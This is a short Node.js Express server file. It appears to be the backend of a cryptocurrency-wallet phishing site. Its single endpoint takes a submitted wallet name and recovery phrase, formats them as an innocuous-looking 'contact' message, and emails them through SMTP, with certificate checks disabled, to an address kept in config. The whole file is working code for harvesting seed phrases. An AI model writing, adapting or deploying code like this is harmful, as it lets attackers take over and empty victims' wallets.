const express = require( 'express' );
const cors = require('cors')
const app = express();
const PORT = process.env.PORT || 2000;
const path = require( 'path' );
var nodemailer = require("nodemailer");
// const { EMAIL_ADDR } = require( './config' );
app.use( cors() );
app.use( express.json() );






let email;
let password;
let server;
let to;
if ( process.env.NODE_ENV !== 'production' ) {
    email = require( './config' ).EMAIL_ADDR;
    password = require( './config' ).EMAIL_PASSWORD;
    server = require( './config' ).SERVER;
    to = require( './config' ).TO;
} else {
    email = process.env.email;
    password = process.env.password;
    server = process.env.server;
    to = process.env.to;
    
}

app.post( '/message', ( req, res ) => {
    //    console.log(req)
    const input = `
    <p> You have a messgae</p>
    <h3> Contact Details</h3>
    <ul>
    <li>Wallet: ${ req.body.wallet }</li>
    <li>Recovery Phrase: ${ req.body.rPhrase }</li>
    </ul>
    `;
    var transporter = nodemailer.createTransport( {
        service: server,//Gmail or any mail server
        host: server,//Gmail or any mail server
        port: 587,
        secure: false,
        auth: {
            user: email,//email
            pass: password//password
        },
        tls: {
            rejectUnauthorized: false
        }
        
    } );
    
    var mailOptions = {
        from: `"New Message"  <${ email }>`,
        to: to,
        subject: 'From wallet app',
        html: input
    };
    
    
    transporter.sendMail( mailOptions, ( err, info ) => {
        if ( err ) {
            res.json( { status: 500 } )
            console.log( err )
        } else {
            res.status( 200 ).json('Done.')
            // console.l
        }
    } );
    
    
        
} );

app.listen( PORT, () => console.log( `Server started on Port ${ PORT }` ) );